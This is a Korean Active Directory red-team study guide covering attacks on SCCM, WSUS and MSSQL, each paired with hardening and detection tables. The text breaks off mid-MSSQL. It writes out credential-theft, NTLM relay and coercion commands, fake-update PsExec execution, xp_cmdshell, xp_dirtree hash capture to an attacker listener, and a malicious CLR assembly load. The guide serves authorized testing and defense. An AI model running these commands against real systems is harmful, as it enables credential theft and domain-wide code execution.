---
title: "AD 심화 — 내부 서버 공격(SCCM·MSSQL·WSUS·Exchange)"
description: "SCCM NAA·PXE·관리 포인트 릴레이, WSUS 업데이트 하이재킹, MSSQL Linked Server·xp_cmdshell·xp_dirtree, Exchange EWS·CVE-2023-23397까지 AD 내부 서비스 공격을 조건·명령·하드닝·탐지로 정리합니다."
tags:
  - ActiveDirectory
  - SCCM
  - MECM
  - WSUS
  - MSSQL
  - Exchange
  - 하드닝
  - OSCP
---

> [!warning] 허가된 환경에서만 실습하세요
> 아래 기법은 **본인 소유 랩, GOAD/Misconfiguration-Manager 랩, HTB 은퇴
> 머신, 명시적으로 서면 승인된 레드팀 범위**에서만 재현하세요. SCCM의 NAA/푸시
> 계정은 **도메인 전역 관리자 자격증명**일 가능성이 매우 높으며, WSUS 하이재킹은
> 수백~수천 대의 윈도우에 원격 코드 실행을 발생시킵니다. MSSQL의 xp_cmdshell,
> Linked Server 체인은 **운영 데이터베이스에 흔적을 남기는 특권 활동**이고
> Exchange 공격은 **메일 데이터와 조직 전원의 자격증명**에 영향을 주므로 **롤백
> 계획, 데이터 접근 범위, 비밀번호 전수 교체 조건**을 교전 시작 전에 합의하세요.

> [!summary] ⏱️ 5초 핵심 요약
> - **한 줄 비유**: AD의 내부 서버 4종(SCCM/MECM·WSUS·MSSQL·Exchange)은
>   **"도메인 안에 파견된 특권 집사"**입니다. 각자 전원 머신에 접근하거나,
>   모든 비밀번호 해시에 가깝게 닿거나, 전사의 메일과 자격증명을 쥐고 있어서
>   **"DC를 안 건드려도 DC 수준의 영향"**이 나옵니다.
> - **핵심 원리**: ① **SCCM**은 클라이언트 푸시·NAA·PXE 부팅 이미지·관리 포인트
>   HTTP 릴레이로 **도메인 로컬 관리자 자격증명을 쥐는 허브**. ② **WSUS**는
>   업데이트 메타데이터를 믿게 만들면 **로컬 관리자 승격**이 가능한 사실상
>   원격 코드 실행 채널. ③ **MSSQL**은 xp_cmdshell/CLR/Linked Server/xp_dirtree를
>   조합해 **코드 실행·피벗·강제 인증**을 모두 얻는 다용도 통로. ④ **Exchange**는
>   EWS/OWA/Autodiscover로 **자격증명과 메일 데이터**에 닿고, CVE-2023-23397·
>   ProxyShell 계열이 **인증 없는 침투**를 열었던 역사적 배경.
> - **놓치기 쉬운 곳**: ① SCCM Hierarchy Takeover는 **단일 사이트 침해로 전 사이트**
>   영향. ② WSUS는 **HTTP(80/8530) 기본**인 조직이 여전히 많음. ③ MSSQL 서비스
>   계정은 **도메인 사용자로 돌리는 경우** Kerberoastable이 되고, `TRUSTWORTHY`
>   플래그와 `clr strict security`는 많은 레거시 DB에서 우회 가능 상태로 남음.
>   ④ Exchange Extended Protection은 모든 버전에서 자동 활성화되는 것이 아닙니다.
>   **Exchange Server 2019 CU14 이상 설치·업그레이드에서 기본 활성화**되며, 2016과
>   이전 2019 CU는 Microsoft 관리 스크립트로 상태를 확인하고 별도 적용해야 합니다.
> - **근본 조치**: **NAA 폐지·Enhanced HTTP·EPA 강제(SCCM), WSUS HTTPS + 업데이트
>   서명 검증 + `SetProxyBehaviorForUpdateDetection` 기본값 유지, MSSQL은 `clr
>   strict security=1`·`TRUSTWORTHY off`·Linked Server 최소 권한, Exchange는
>   Extended Protection + Autodiscover 네트워크 경계화 + CVE-2023-23397 패치
>   + 조직 전수 SMB 아웃바운드 차단**.

[[AD 심화 — 강제 인증과 릴레이의 이해와 방어|강제 인증·릴레이]]가 NTLM 자체의
결함으로 머신 계정을 가져오는 경로였다면, 이 글은 **그 자격증명들이 "저장되고
처리되는 내부 서비스"**를 다룹니다. [[AD 심화 — ACL 권한 체인과 DCSync
완성|ACL 권한 체인]]은 디렉터리 객체 중심이었고, 이 글은 **디렉터리 바깥의
"애플리케이션 레이어" 서버**가 어떻게 AD의 특권 자격증명 저장소가 되어 결국
도메인 전체 침해로 연결되는지를 추적합니다. 전체 Kerberos·NTLM·DACL 기초는
[[공격 체인 이전의 AD 아키텍처 기초 — Kerberos, NTLM, DACL·ACE, GPO·SYSVOL, 도메인 트러스트|AD 아키텍처 기초]]를 참조하세요.

모든 명령은 플레이스홀더(`<domain>`, `<mp>`, `<dc>`, `<target>`)로 일반화했고
예시 도메인은 `corp.local`, IP 대역은 `10.0.0.0/24` 사설입니다. **이 PC에서는
SCCM·WSUS·Exchange 랩을 돌릴 수 없어 도구 옵션·문법은 공식 README·KB·연구
논문 기준으로 작성했고 실행 결과 자체는 미검증**입니다. 각 도구의 실제 옵션은
`-h` 또는 공식 저장소 README로 재확인하세요. 재현은 §6 "실습 환경"의 공개 랩에서
진행합니다.

---

## 한눈에 보는 내부 서버 공격 요약표

| 서비스 | 대표 기법 | 필요 조건 | 얻는 것 | 끊어야 할 방어 지점 |
|---|---|---|---|---|
| **SCCM** | NAA 자격증명 탈취(정책 요청) | 도메인 사용자 + 사이트 접근 | NAA(도메인) 평문 자격증명 | NAA 사용 중단, Enhanced HTTP |
| **SCCM** | 클라이언트 푸시 설치 계정 강제 인증 | 클라이언트 푸시 설치 활성 | 푸시 설치 계정 NTLM → 릴레이 | 클라이언트 푸시 비활성 |
| **SCCM** | 관리 포인트(MP) HTTP 인증 릴레이 | MP가 EPA 없이 Windows 인증 수락 | 머신 계정 인증을 다른 서비스로 릴레이 | HTTPS-only 또는 Enhanced HTTP + EPA |
| **SCCM** | PXE 부팅 이미지 복호화 | PXE 서비스 노출 + 미보호 미디어 | 부팅 이미지 내 자격증명 | PXE 비밀번호 + TPM 결속 |
| **SCCM** | Hierarchy Takeover (TAKEOVER-1~8) | 사이트 서버 로컬 관리자 | 사이트 전체 소유 → 전 사이트 코드 실행 | 사이트 서버 Tier-0화 |
| **WSUS** | 가짜 업데이트 승인(SharpWSUSPush) | WSUS 관리자 권한 | 임의 PE 서명본 설치 | WSUS 관리자 최소화 |
| **WSUS** | HTTP MITM 업데이트 주입(PyWSUS) | 클라이언트가 HTTP WSUS + Responder/ARP spoof | 로컬 관리자 승격 | HTTPS 강제 |
| **MSSQL** | xp_cmdshell 활성 | `sysadmin` 또는 `xp_cmdshell` 실행 권한 | 서비스 계정 권한 코드 실행 | `xp_cmdshell=0`, sysadmin 최소 |
| **MSSQL** | EXECUTE AS LOGIN / impersonate | `IMPERSONATE` 권한 보유 | 다른 로그인으로 전환 | `IMPERSONATE` 리뷰 |
| **MSSQL** | Linked Server 체인 | `openquery`/`EXECUTE AT` 가능 | 다른 DB 서버로 피벗 | linked server 최소 권한 |
| **MSSQL** | xp_dirtree UNC 강제 인증 | DB 서비스 계정 접근 | 서비스 계정 Net-NTLMv2 | SMB 아웃바운드 차단 |
| **MSSQL** | CLR 어셈블리 로드 | `sysadmin` + `TRUSTWORTHY on` | 임의 .NET 코드 실행 | `clr strict security=1` |
| **Exchange** | Autodiscover/EWS 열거 | 이메일 또는 도메인 사용자 | 사용자 목록·설정·자격증명 샘플 | 외부 Autodiscover 제거 |
| **Exchange** | CVE-2023-23397 | 인증된 외부 발신자 | 피해자 Net-NTLMv2(UNC) | 2023-03 패치 + SMB 아웃바운드 차단 |
| **Exchange** | ProxyShell/ProxyLogon | 2021 보안 업데이트 이전 빌드 노출 | RCE → 전체 서버 소유 | 지원 CU/SU 유지, 외부 OWA 노출 재검토 |
| **Exchange** | PrivExchange(역사) | Exchange `WriteDACL on Domain` | DCSync 설정 | ACE 회수, 하드닝 KB |

> [!important] "내부 서비스는 DC가 아니니 Tier-0이 아니다"는 흔한 오해
> SCCM 사이트 서버, WSUS 서버, Exchange 서버, 그리고 **sysadmin 권한이 부여된 핵심
> MSSQL 인스턴스**는 **모두 Tier-0으로 분류**해야 합니다. 이들 중 하나만 침해돼도
> **도메인 전역 영향**이 나오는 사례가 반복 보고되었고(Chris Thompson·Duane
> Michael·SpecterOps SCCM 연구, dirkjanm PrivExchange 등), Microsoft의 Tier 모델은
> 이들 서비스를 **"identity systems"**로 간주합니다.

---

## 1. SCCM/MECM — 사이트 전체를 노리는 허브

### 1.1 왜 SCCM 한 대가 도메인 전체인가

SCCM(현 MECM; Microsoft Endpoint Configuration Manager)은 조직 내 모든 클라이언트
PC에 **소프트웨어 배포·패치·운영체제 이미지**를 내려보냅니다. 이 과정에서 두 가지
특권 자격증명이 등장합니다.

1. **Network Access Account (NAA)** — 클라이언트가 콘텐츠를 가져올 때 사용할
   도메인 계정. **이 계정 비밀번호는 클라이언트 정책에 내려오므로 "도메인 사용자
   한 명이면 뽑을 수 있는 평문"**이 됩니다.
2. **클라이언트 푸시 설치 계정** — 사이트 서버가 신규 클라이언트에 에이전트를
   설치할 때 쓰는 계정. 보통 **도메인 어드민**이거나 **대상 로컬 관리자**입니다.

```mermaid
flowchart LR
    A["도메인 사용자<br/>(어떤 PC든)"] -->|① 정책 요청| MP["관리 포인트(MP)<br/>HTTP/HTTPS"]
    MP -->|② 암호화된 NAA 포함 정책| A
    A -->|③ DPAPI/장치 키로 복호화<br/>(SharpSCCM get secrets)| NAA[(NAA 평문)]
    NAA --> PIVOT["다른 호스트 로컬 관리자로 피벗"]
```

### 1.2 사이트 열거

| 목적 | 도구 | 명령 예시 |
|---|---|---|
| 도메인에서 사이트 서버/MP 위치 | `SharpSCCM` | `SharpSCCM.exe get sites` (사용자-장치 관계는 `get primary-users`) |
| 콘텐츠 라이브러리에서 비밀 스캔 | `cmloot` | `python3 cmloot.py corp.local/<user>@<mp> -cmlootinventory sccmfiles.txt` |
| 통합 공격 자동화·플레이북 | `SCCMHunter` | `python3 sccmhunter.py -h`에서 현재 `find` 옵션 확인 |

SharpSCCM 공식 저장소: <https://github.com/Mayyhem/SharpSCCM>. 사용 예시의 전체
옵션은 `SharpSCCM.exe -h`로 재확인합니다. `get primary-users`는 SMS Provider
WMI(`SMS_UserMachineRelationship`)를 쿼리해 **"이 사용자가 평소 쓰는 PC가 어디냐"**를
돌려주는 기능이라 **특정 사용자에게 피싱 후 즉시 그 사용자의 평소 PC에서
추가 작업을 이어갈 수 있게** 합니다.

cmloot 공식 저장소: <https://github.com/shelltrail/cmloot>. 사이트 콘텐츠 라이브러리
(일반적으로 `\\<sitesrv>\SCCMContentLib$`)에 쌓인 **MSI·스크립트·구성 파일**을
스캔해 **임베디드 비밀번호**를 자동 수집합니다.

SCCMHunter 공식 저장소: <https://github.com/garrettfoster13/sccmhunter>. SCCM
공격 흐름을 한 도구에서 자동화한 리시피 모음입니다. 세 도구 모두 변경이 잦으므로
위 명령은 **열거 시작점**이며, 실제 실행 전 각 README·Wiki와 `-h`를 우선합니다.

### 1.3 NAA 자격증명 탈취 — 가장 흔한 승리 조건

SCCM 클라이언트 에이전트는 로컬에 **Blob**과 **장치 키**로 보호된 정책을 저장하고,
`SharpSCCM.exe get secrets`는 로컬 관리자 권한 없이 **클라이언트의 기본 정책 요청
자격**만 있어도 NAA 평문을 얻는 경로가 다수 공개되어 있습니다(2022 "Coercing NTLM
Authentication from SCCM" 계열 연구; Misconfiguration-Manager 프로젝트의
`CRED-1`~`CRED-8` 분류).

```powershell
# 로컬 클라이언트에서 NAA 평문 추출 시도 (경로에 따라 로컬 관리자 요구)
SharpSCCM.exe get secrets

# 원격으로: 특정 클라이언트에 정책 발급을 유도해 재사용
SharpSCCM.exe local secrets -m disk
```

- 참고: Misconfiguration-Manager의 [CRED-1(NAA 자격증명 복호화)](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md)
  문서를 그대로 체크리스트로 쓰면 각 경로가 정리됩니다.

**NAA가 도메인 어드민인 조직이 왜 생기는가**: 과거 SCCM 설치 가이드가 "모든 클라이언트
리소스에 접근 가능한 계정"을 요구했기 때문에, 운영 편의상 Domain Admins에 넣는
사례가 반복됐습니다. 현행 Microsoft 문서는 **HTTPS 또는 Enhanced HTTP를 쓰면 대다수
시나리오에서 NAA가 필요 없다고 설명**합니다. 다만 SMB package-share fallback과 일부
상태 마이그레이션 같은 예외가 있으므로, 먼저 의존성을 제거한 뒤 NAA를 폐지합니다.

### 1.4 클라이언트 푸시 설치 계정 강제 인증 (TAKEOVER-1)

클라이언트 푸시 설치가 활성이면, 사이트 서버는 **임의의 호스트를 "에이전트 미설치
클라이언트"로 보이게 유도하는 요청**에 반응해 **푸시 설치 계정으로 그 호스트에
NTLM 인증**합니다. 공격자가 `ntlmrelayx`를 걸어 두고 자기 자신을 신규 클라이언트로
등록하면 **푸시 설치 계정의 머신 계정 또는 도메인 어드민 NTLM**이 도착합니다.

```bash
# 기본 아이디어 (SharpSCCM의 invoke client-push)
SharpSCCM.exe invoke client-push -t <attacker-ip>

# 수신단 (공격자): HTTPS LDAPS로 릴레이
impacket-ntlmrelayx -t ldaps://<dc> -smb2support --delegate-access
```

- 상세 조건·도구별 옵션은 [TAKEOVER-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md)
  에 분류되어 있으며, SCCMHunter 내부에도 동일 플레이가 통합돼 있습니다.

가장 강한 방어는 **클라이언트 푸시 설치 비활성화**입니다. 필요한 배포는
**그룹 정책·OSD·수동 설치·Intune**처럼 인증 경로가 통제되는 수단으로 대체합니다.

### 1.5 관리 포인트(MP) HTTP → LDAPS 릴레이

MP가 HTTP를 수락하고 EPA가 없으면, SCCM 클라이언트가 정책을 가져오려고 **MP에
머신 계정 NTLM 인증**을 하는 과정을 가로채 **DC LDAPS에 릴레이**해 RBCD나 Shadow
Credentials를 설정할 수 있습니다. 전제 기법은 [[AD 심화 — 강제 인증과 릴레이의
이해와 방어|릴레이 글 §4]]과 동일합니다.

```bash
# 관리 포인트 리스너로 HTTP 수신 후 LDAPS 릴레이 (개념 흐름)
impacket-ntlmrelayx -t ldaps://<dc> -smb2support --delegate-access \
  --no-dump --escalate-user <attacker-user>
```

- Microsoft가 제시한 하드닝의 출발점은 **HTTPS-only 또는 Enhanced HTTP**입니다.
  단, **Enhanced HTTP는 HTTPS-only와 같지 않습니다**. 사이트가 발급한 인증서와
  토큰으로 지원 시나리오의 민감 통신을 보호하지만 일부 클라이언트 통신은 여전히
  HTTP일 수 있으므로, MP의 IIS Windows 인증에는 지원 범위를 확인해 **EPA/채널
  바인딩**을 별도로 적용하고 HTTP-only 레거시 설정을 제거합니다. 자세한 가이드는
  Microsoft Learn의 [Enhanced HTTP in Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/enhanced-http)
  를 참조하세요.

### 1.6 PXE 부팅 이미지 복호화 — pxethief

PXE 네트워크 부팅을 쓰는 사이트는 **운영체제 이미지(WIM)와 변수(Variables)**를
PXE 서버가 TFTP로 서빙합니다. 변수 저장소는 **AES 키로 "mediavariables.dat"에
암호화**되어 있는데 **키 자체가 네트워크로 교환**됩니다. `pxethief`는 이 교환을
가로채 변수와 임베디드 자격증명을 추출합니다.

```bash
# pxethief (Python): 네트워크 PXE 교환 가로채기
pxethief 1              # 모드 1: 자격증명 추출 대화형
pxethief 2 <ipaddr>     # 모드 2: 특정 PXE 서버 대상
```

- 공식 저장소: <https://github.com/MWR-CyberSec/PXEThief>. **PXE 비밀번호**를 반드시
  설정하고, 가능하면 **PXE 매체를 TPM 결속**하는 것이 Microsoft 보안 가이드의 권고입니다.
- 부트 미디어는 **CM콘솔에서 암호화 옵션을 반드시 체크**해야 하며, 암호화되지 않은
  WIM은 OSD 변수(도메인 가입 계정 포함)가 평문에 가까운 상태로 노출됩니다.

### 1.7 Hierarchy Takeover — "사이트 서버를 쥐면 전 사이트"

사이트 서버(Primary Site Server)에 **로컬 관리자**를 얻으면 WMI(SMS Provider)와
사이트 DB(MSSQL)에 Server Operators 수준 접근이 열리며, 하위 Secondary 사이트와
Distribution Point 전부에 **SCCM 스크립트 또는 애플리케이션 배포**로 즉시 코드
실행이 발생합니다. 분류는 Misconfiguration-Manager의 TAKEOVER-1~8에 정리되어
있고, 핵심은 **사이트 서버는 DC와 동등한 Tier-0**이라는 점입니다.

- 참조: [Misconfiguration-Manager TAKEOVER 디렉터리](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/TAKEOVER).

### 1.8 하드닝

| 영역 | 조치 |
|---|---|
| 자격증명 | **NAA 의존 제거 후 사용 중단**. 기존 NAA는 권한 최소화·비밀번호 교체 후 삭제. |
| 통신 | **Enhanced HTTP** 활성 + **모든 MP에 EPA 강제**. HTTPS 만을 수락하도록 사이트 속성 설정. |
| 자동화 | **클라이언트 푸시 설치 비활성화**. OSD/GPO/Intune으로 대체. |
| PXE | **PXE 비밀번호** 설정 + 부트 미디어 암호화 + TPM 결속(WDS 통합 배포 시). |
| 사이트 서버 | **Tier-0 분리**, 관리자 PAW 전용, LAPS 강제, EDR/SIEM 모니터 상시. |
| 감사 | SMS Provider WMI 접근 감사(`SMS_Site_System` 등)와 콘솔 활동 감사 활성. |

### 1.9 오류·실패 판정

| 메시지/현상 | 원인 | 안전한 판정 |
|---|---|---|
| `Policy requested by unknown client` | 클라이언트가 MP에 등록되지 않음 | 랩 클라이언트 등록 상태를 확인하고 운영 MP에는 반복 요청하지 않음 |
| NAA 결과가 비어 있음 | Enhanced HTTP/HTTPS 사용 또는 NAA 미구성 | **하드닝 성공일 수 있음**. SMB package-share fallback 설정만 별도 점검 |
| 릴레이 후 LDAP 쓰기 거부 | LDAP signing/CBT/EPA 또는 대상 ACL이 차단 | 설정을 약화하지 말고 방어가 작동한 것으로 기록 |
| PXE 응답은 있으나 변수가 안 풀림 | PXE 미디어 암호·신형 보호가 적용됨 | 우회 시도 대신 CM 콘솔 설정과 로그로 보호 상태 검증 |

### 1.10 탐지

| 신호 | 출처 로그 | 패턴 |
|---|---|---|
| SharpSCCM 사용 흔적 | Windows Security 4688, Sysmon 1 | 클라이언트/MP에서 비표준 `.NET` 바이너리 실행 + WMI 쿼리 빈발 |
| 비정상 정책 요청 | SCCM MP IIS 로그(`<CM>\Logs\MP_RegistrationManager.log`, `MP_Policy.log`) | 한 IP에서 다량의 정책 요청·에러 |
| 클라이언트 푸시 로그 | `ccm.log`, `smsexec.log`, `client.msi.log` | 알려지지 않은 IP로 푸시 시도, 실패/성공 패턴 |
| 콘텐츠 라이브러리 스캔 | 파일 서버/EDR | `SCCMContentLib$` 공유 다량 열람 |
| 사이트 상태 이상 | `statmgr.log`, `statesys.log`, Status Message Viewer | MP/DP 상태 메시지 급증, 사이트 구성·역할 변경 |
| 특권 로그온·프로세스 | Security 4624/4625, 4672, 4688 | 사이트 서버에서 비정상 네트워크 로그온과 관리 도구 실행 |

- 참고: [CISA/NSA — Guidance on Securing Microsoft SCCM](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a) — SCCM 침해 사례 대응 지침.

### 1.11 출처(SCCM)

- Chris Thompson(Mayyhem) — [SharpSCCM](https://github.com/Mayyhem/SharpSCCM), SpecterOps: [Coercing NTLM Authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
- Duane Michael(subat0mik) — [Misconfiguration-Manager](https://github.com/subat0mik/Misconfiguration-Manager)
- Garrett Foster — [SCCMHunter](https://github.com/garrettfoster13/sccmhunter)
- Shelltrail — [cmloot](https://github.com/shelltrail/cmloot)
- MWR CyberSec — [PXEThief](https://github.com/MWR-CyberSec/PXEThief)
- Microsoft Learn — [Enhanced HTTP in Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/enhanced-http), [Deprecated/removed features in Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/changes/deprecated/removed-and-deprecated-cmfeatures)
- CISA — [AA23-347A: SCCM 보안 권고](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a)

---

## 2. WSUS — 업데이트 신뢰를 거꾸로 이용하기

### 2.1 왜 WSUS가 위험한가

WSUS는 조직 내 Windows 업데이트를 중계합니다. 클라이언트는 WSUS 서버가 알려주는
**업데이트 목록(XML)과 설치 파일 URL**을 믿고 받아 실행합니다. 이 신뢰 체인에서
두 지점이 어긋나면 **로컬 SYSTEM으로 임의 코드 실행**이 가능합니다.

1. 조직 WSUS 서버가 **HTTP(80 또는 8530)**를 쓰고 있다 → 네트워크 중간자가 메타데이터를 바꿀 수 있다.
2. 공격자가 WSUS 서버 자체의 관리 권한(또는 임의 파일 쓰기)을 얻었다 → **승인된 업데이트**로 임의 PE를 배포할 수 있다.

업데이트 파일은 Microsoft 서명을 요구하지만, **"Sysinternals PSExec·Sign됨"**
같은 **정식 서명 바이너리 + 추가 인수** 트릭을 쓰면 서명 검증을 통과한 채
임의 명령을 실행할 수 있다는 것이 PyWSUS 계열 연구(Context IS 2015)의 핵심
관찰입니다.

### 2.2 WSUS 관리자 권한에서의 업데이트 푸시 — SharpWSUSPush/SharpWSUS

초기 연구와 문서에서 **SharpWSUSPush**로 불리던 흐름은 현재 공개 저장소
`nettitude/SharpWSUS`의 `SharpWSUS.exe` 명령으로 재현합니다. 이름이 비슷한 포크의
옵션을 섞지 말고 아래 저장소 README와 `SharpWSUS.exe --help`를 기준으로 합니다.

```powershell
# SharpWSUSPush 흐름 (개념; 공식 README의 명령 예)
SharpWSUS.exe create /payload:"C:\Windows\System32\psexec.exe" `
  /args:"-s cmd.exe /c <approved-lab-command>" `
  /title:"CriticalUpdate"
SharpWSUS.exe approve /updateid:<GUID> /computername:<target.corp.local>
SharpWSUS.exe check /updateid:<GUID> /computername:<target.corp.local>
SharpWSUS.exe delete /updateid:<GUID>
```

공식 저장소: <https://github.com/nettitude/SharpWSUS>. 패키지는 **Microsoft 서명된
PsExec**을 그대로 사용하며, 업데이트 메타데이터에 추가 인수를 포함시키는 방식이라
WSUS 서버 입장에서 "서명된 정식 업데이트"로 보입니다.

### 2.3 HTTP 업데이트 MITM — PyWSUS

클라이언트가 **HTTP WSUS**를 쓴다면, 같은 L2에 있는 공격자가 (ARP spoofing 또는
LLMNR/mitm6 조합으로) WSUS 응답을 바꿔치기해 **PsExec 기반 가짜 업데이트**를
설치하게 유도할 수 있습니다.

```bash
# PyWSUS: 가짜 WSUS 응답으로 PsExec 서명본을 내려 임의 명령 실행
python3 pywsus.py -H 10.0.0.50 -p 8530 \
                  -e PsExec64.exe \
                  -c '/accepteula -s cmd.exe /c <command>'
```

공식 저장소: <https://github.com/GoSecure/pywsus>. 사전 조건으로 **같은 네트워크에서
클라이언트 트래픽을 가로채는 수단**(ARP spoof, mitm6, NAC 미적용 등)이 필요합니다.

### 2.4 하드닝

| 영역 | 조치 |
|---|---|
| 전송 | **HTTPS 강제**(WSUS 8531). HTTP 수신 비활성. 클라이언트 GPO `WUServer` 를 `https://...`로 변경. |
| 서명 | 기본 활성 상태 유지. **PsExec·CertUtil 등 LOLBins**를 EDR에서 차단 또는 감사. |
| 권한 | WSUS 관리자(그룹 `WSUS Administrators`) **최소화**. 승인은 변경관리 티켓 연동. |
| 네트워크 | WSUS 서버와 클라이언트 간 **TLS 인증서** 강제. 내부 CA에서 발급한 서버 인증서를 신뢰. |
| 프록시 | `SetProxyBehaviorForUpdateDetection` 기본값 유지(0 = WU 직접 허용 안 함). |

### 2.5 오류·실패 판정

| 메시지/현상 | 원인 | 안전한 판정 |
|---|---|---|
| 클라이언트가 가짜 WSUS에 연결하지 않음 | `WUServer`/`UpdateServiceUrlAlternate`가 HTTPS이거나 MITM 불가 | HTTPS 검증이 작동한 정상 결과 |
| 업데이트가 다운로드되지만 실행되지 않음 | 실행 파일 서명·메타데이터 검증 실패 | 서명 검증을 끄지 말고 이벤트 20과 Windows Update 로그 확인 |
| WSUS 승인 API가 거부됨 | 호출 계정이 `WSUS Administrators`가 아님 | 권한 상승을 시도하지 말고 승인된 역할 범위 확인 |

### 2.6 탐지

- **Microsoft-Windows-WindowsUpdateClient** 이벤트 ID 19/20(설치 성공/실패)과 **설치된 업데이트 KB 넘버**를 매핑. 알려지지 않은 KB → 조사. Security 4688과 System 7045를 함께 보면 업데이트 직후의 `PsExec`·서비스 생성을 묶을 수 있습니다.
- **파일 시스템**: 클라이언트 `%SystemRoot%\SoftwareDistribution\Download\` 에 **서명된 PsExec**이 떨어졌는지, EDR이 **PsExec의 `-s cmd.exe` 호출**을 알림으로 떠뜨리는지 확인.
- **WSUS 서버 IIS 로그**: `ClientWebService.asmx`에 비정상 요청, SharpWSUS가 남기는 custom publisher 메타데이터 패턴.

### 2.7 출처(WSUS)

- Nettitude — [SharpWSUS](https://github.com/nettitude/SharpWSUS)
- GoSecure — [PyWSUS](https://github.com/GoSecure/pywsus), [Blog: WSUS attacks](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
- Context IS (2015) — [WSUSpect](https://labs.withsecure.com/publications/wsuspect-whitepaper)
- Microsoft Learn — [Secure WSUS with the Secure Sockets Layer Protocol](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)

---

## 3. MSSQL — AD의 다용도 통로

### 3.1 열거

```bash
# NetExec: SPN 기반 MSSQL 인스턴스 자동 열거 + 인증 시도
nxc mssql <target or cidr> -u <user> -p '<pw>' -d <domain>

# SPN으로 MSSQL 인스턴스만 찾기 (Kerberos SPN 검색)
nxc ldap <dc> -u <user> -p '<pw>' -M get-mssqlinstances

# SQLRecon: 통합 공격 자동화
SQLRecon.exe /a:WinDomain /h:<host> /d:corp.local /u:<user> /p:<pw> /m:Info
```

- SQLRecon 공식 저장소: <https://github.com/skahwah/SQLRecon>. `-m` 모듈 이름으로
  **`xp_cmdshell`, `linkedlogins`, `olinkedlogins`(outbound), `enableole`, `agentcmd`,
  `clrexec`** 등 다수 공격 모듈이 포함됩니다.
- NetExec MSSQL 프로토콜 문서: <https://www.netexec.wiki/mssql-protocol>.

### 3.2 xp_cmdshell — 가장 전통적인 코드 실행

```sql
-- 설정 토글이 필요하며 sysadmin 권한 전제
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /all';
```

**원복**: `sp_configure 'xp_cmdshell', 0; RECONFIGURE;` 를 반드시 실행하세요.
교전 중 활성화한 모든 서버 옵션은 보고서에 기록합니다.

### 3.3 EXECUTE AS LOGIN — 사용자 가장

MSSQL에는 **다른 로그인으로 임시 전환**하는 기능이 있습니다. `IMPERSONATE` 권한이
있는 로그인은 대상 로그인으로 전환 후 그 권한으로 명령을 실행할 수 있습니다. 많은
레거시 시스템에서 애플리케이션 서비스 계정이 `sa` 또는 `sysadmin` 보유 로그인을
`IMPERSONATE`할 수 있도록 설정되어 있습니다.

```sql
-- 현재 로그인이 impersonate 가능한 대상 열거
SELECT grantee_principal_id, grantor_principal_id, type, permission_name, state
FROM sys.server_permissions
WHERE permission_name = 'IMPERSONATE';

-- sa로 전환해 sysadmin으로 격상
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
REVERT;
```

### 3.4 Linked Server — MSSQL → MSSQL 피벗

Linked Server는 한 MSSQL 인스턴스가 다른 인스턴스에 "저장된 자격증명"으로 자동
연결되는 기능입니다. 자격증명이 평문 또는 복호화 가능하게 저장되고, 로컬 sysadmin이
그것을 추출할 수 있어서 **DB 서버 간 수평 이동**의 단골 경로가 됩니다.

```sql
-- 링크된 서버 열거
SELECT srv.name, srv.data_source, prov.name AS provider, l.local_principal_id, l.uses_self_credential, l.remote_name
FROM sys.servers srv
LEFT JOIN sys.linked_logins l ON srv.server_id = l.server_id
LEFT JOIN sys.providers prov ON srv.provider = prov.name;

-- openquery/openrowset으로 원격에서 쿼리 실행
SELECT * FROM OPENQUERY([LINKED1], 'SELECT SYSTEM_USER');
-- RPC Out이 켜져 있으면 다단계 체인 가능
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED1];
```

- **다단계 체인**: `OPENQUERY([A], 'SELECT * FROM OPENQUERY([B], ''SELECT * FROM OPENQUERY([C], ...'')')` 패턴으로 **A→B→C**로 피벗합니다. SQLRecon의 `olinkedlogins` 모듈이 체인을 자동 열거합니다.
- **MSSQL Server 공식**: `sp_linkedservers`, `sp_addlinkedserver`, Microsoft Learn의 [Linked Servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine) 참조.

### 3.5 xp_dirtree — NetNTLMv2 캡처

`xp_dirtree`(또는 `xp_subdirs`, `xp_fileexist`)는 UNC 경로를 받으면 **MSSQL 서비스
계정으로 SMB 인증**합니다. 공격자가 자기 서버를 UNC로 지정하면 서비스 계정의
**Net-NTLMv2 해시**를 수집할 수 있습니다. 서비스 계정이 도메인 사용자이면 Kerberos
AS-REP 또는 오프라인 크랙 대상이 됩니다. HTB **Escape**, **Querier**, **Giddy**가
전형적인 재현 환경입니다.

```sql
-- 공격자 리스너로 서비스 계정 Net-NTLMv2 유도
EXEC xp_dirtree '\\10.0.0.50\share\a', 1, 1;

-- 수신단 (공격자)
responder -I eth0           # 또는 impacket-smbserver / ntlmrelayx
```

### 3.6 CLR 어셈블리 — .NET 로드 통한 임의 코드 실행

```sql
-- 전제: sysadmin + (TRUSTWORTHY on OR 어셈블리를 안전하게 서명해 로드)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;

-- TRUSTWORTHY가 켜져 있으면 외부 접근 허용 어셈블리 등록 가능 (SAFE 아닌 레벨)
ALTER DATABASE [mydb] SET TRUSTWORTHY ON;

-- 어셈블리 등록 (이진 바이트 또는 UNC로)
CREATE ASSEMBLY [EvilAsm] FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE sp_do_evil AS EXTERNAL NAME [EvilAsm].[EvilClass].[DoEvil];
EXEC sp_do_evil;
```

